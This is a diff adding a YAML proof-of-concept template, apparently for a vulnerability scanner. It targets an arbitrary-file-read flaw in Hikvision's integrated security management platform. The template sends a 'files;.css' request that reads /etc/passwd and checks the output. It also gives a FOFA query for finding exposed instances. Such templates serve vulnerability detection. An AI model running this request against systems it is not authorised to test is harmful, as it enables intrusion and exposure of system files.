@@ -1,0 +1,23 @@
+id: poc-yaml-hikvision-zongheanfang-manager-files-css-anyfile-read
+info:
+  name: 海康威视综合安防管理平台 files;.css 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: HiKVISION 综合安防管理平台
+  fofa: body="/portal/skin/isee/redblack/"
+requests:
+- method: GET
+  path: /lm/api/files;.css?link=/etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin/bash") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
